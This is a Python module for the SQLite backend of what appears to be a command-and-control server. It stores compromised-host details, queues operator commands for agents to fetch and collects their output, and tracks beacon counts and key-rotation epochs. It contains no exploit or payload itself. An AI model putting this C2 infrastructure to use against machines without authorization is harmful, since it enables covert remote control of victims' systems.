import sqlite3
import os
import json
import time
from contextlib import contextmanager
from datetime import datetime

class C2Database:
    def __init__(self, db_path="data/c2.db"):
        self.db_path = db_path
        os.makedirs(os.path.dirname(os.path.abspath(db_path)), exist_ok=True)
        self._init_db()

    @contextmanager
    def _get_conn(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL;")
        conn.execute("PRAGMA synchronous=NORMAL;")
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise
        finally:
            conn.close()

    def _init_db(self):
        with self._get_conn() as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS agents (
                    agent_id TEXT PRIMARY KEY,
                    hostname TEXT,
                    os TEXT,
                    user TEXT,
                    ip TEXT,
                    last_seen TEXT,
                    crypto_state TEXT
                )
            """)
            conn.execute("""
                CREATE TABLE IF NOT EXISTS tasks (
                    task_id TEXT PRIMARY KEY,
                    agent_id TEXT,
                    command TEXT,
                    status TEXT,
                    output TEXT,
                    created_at TEXT,
                    operator_id TEXT
                )
            """)
            # Key epochs for session key rotation tracking
            conn.execute("""
                CREATE TABLE IF NOT EXISTS key_epochs (
                    epoch_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT NOT NULL,
                    key_hash TEXT NOT NULL,
                    created_at REAL NOT NULL,
                    expired_at REAL,
                    beacon_count INTEGER DEFAULT 0
                )
            """)
            conn.execute("""
                CREATE INDEX IF NOT EXISTS idx_key_epochs_agent
                ON key_epochs(agent_id, expired_at)
            """)
            conn.commit()

    def update_agent(self, agent_id, hostname, os_name, user, ip, crypto_state):
        with self._get_conn() as conn:
            now = datetime.now().isoformat()
            crypto_json = json.dumps(crypto_state) if crypto_state else "{}"
            
            conn.execute("""
                INSERT INTO agents (agent_id, hostname, os, user, ip, last_seen, crypto_state)
                VALUES (?, ?, ?, ?, ?, ?, ?)
                ON CONFLICT(agent_id) DO UPDATE SET
                    hostname=excluded.hostname,
                    os=excluded.os,
                    user=excluded.user,
                    ip=excluded.ip,
                    last_seen=excluded.last_seen,
                    crypto_state=excluded.crypto_state
            """, (agent_id, hostname, os_name, user, ip, now, crypto_json))
            conn.commit()

    def get_agent_crypto(self, agent_id):
        with self._get_conn() as conn:
            cur = conn.execute("SELECT crypto_state FROM agents WHERE agent_id=?", (agent_id,))
            row = cur.fetchone()
            if row and row["crypto_state"]:
                return json.loads(row["crypto_state"])
            return None

    def get_all_agents(self):
        with self._get_conn() as conn:
            cur = conn.execute("SELECT agent_id, hostname, os, user, ip, last_seen FROM agents")
            return [dict(r) for r in cur.fetchall()]

    def queue_task(self, task_id, agent_id, command):
        with self._get_conn() as conn:
            now = datetime.now().isoformat()
            conn.execute("""
                INSERT INTO tasks (task_id, agent_id, command, status, created_at)
                VALUES (?, ?, ?, 'pending', ?)
            """, (task_id, agent_id, command, now))
            conn.commit()

    def get_pending_tasks(self, agent_id):
        with self._get_conn() as conn:
            cur = conn.execute("SELECT task_id, command FROM tasks WHERE agent_id=? AND status='pending'", (agent_id,))
            tasks = [dict(r) for r in cur.fetchall()]
            
            # Mark as sent
            for t in tasks:
                conn.execute("UPDATE tasks SET status='sent' WHERE task_id=?", (t['task_id'],))
            conn.commit()
            return tasks

    def update_task_result(self, task_id, output, error=""):
        with self._get_conn() as conn:
            status = 'error' if error else 'completed'
            full_out = output if not error else f"Error: {error}\n{output}"
            conn.execute("""
                UPDATE tasks SET status=?, output=? WHERE task_id=?
            """, (status, full_out, task_id))
            conn.commit()

    def get_results(self, agent_id):
        with self._get_conn() as conn:
            cur = conn.execute("SELECT task_id, output, status FROM tasks WHERE agent_id=? AND status IN ('completed', 'error')", (agent_id,))
            results = [dict(r) for r in cur.fetchall()]
            
            for r in results:
                conn.execute("DELETE FROM tasks WHERE task_id=?", (r['task_id'],))
            conn.commit()
            return results

    # ─── Key Epoch Lifecycle ─────────────────────────────

    def create_key_epoch(self, agent_id: str, key_hash: str) -> int:
        """Record a new key epoch for an agent. Returns epoch_id."""
        with self._get_conn() as conn:
            # Expire any active epochs for this agent
            conn.execute("""
                UPDATE key_epochs SET expired_at = ?
                WHERE agent_id = ? AND expired_at IS NULL
            """, (time.time(), agent_id))
            
            cur = conn.execute("""
                INSERT INTO key_epochs (agent_id, key_hash, created_at)
                VALUES (?, ?, ?)
            """, (agent_id, key_hash, time.time()))
            conn.commit()
            return cur.lastrowid

    def increment_beacon_count(self, agent_id: str) -> int:
        """Increment beacon count for active epoch. Returns new count."""
        with self._get_conn() as conn:
            conn.execute("""
                UPDATE key_epochs SET beacon_count = beacon_count + 1
                WHERE agent_id = ? AND expired_at IS NULL
            """, (agent_id,))
            conn.commit()
            
            row = conn.execute("""
                SELECT beacon_count FROM key_epochs
                WHERE agent_id = ? AND expired_at IS NULL
            """, (agent_id,)).fetchone()
            return row["beacon_count"] if row else 0

    def expire_key_epoch(self, agent_id: str):
        """Expire the active key epoch for an agent."""
        with self._get_conn() as conn:
            conn.execute("""
                UPDATE key_epochs SET expired_at = ?
                WHERE agent_id = ? AND expired_at IS NULL
            """, (time.time(), agent_id))
            conn.commit()

    def get_active_epoch(self, agent_id: str):
        """Get the active key epoch for an agent."""
        with self._get_conn() as conn:
            row = conn.execute("""
                SELECT * FROM key_epochs
                WHERE agent_id = ? AND expired_at IS NULL
            """, (agent_id,)).fetchone()
            return dict(row) if row else None
